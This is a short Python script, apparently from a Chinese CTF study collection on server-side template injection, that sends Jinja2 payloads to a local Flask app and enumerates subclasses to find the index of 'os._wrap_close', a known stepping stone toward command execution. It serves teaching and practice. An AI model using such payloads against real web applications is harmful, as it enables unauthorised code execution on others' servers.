# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ssti入门知识点.md
# TITLE: [前言](https://tttang.com/archive/1698/#toc_)
# CATEGORY: web

import requests

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'}
for i in range(500):
    url = "http://127.0.0.1:5000/?name=\
        {{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
    res = requests.get(url=url, headers=headers)
    #print(res.text)
    if 'os._wrap_close' in res.text:
        print(i)
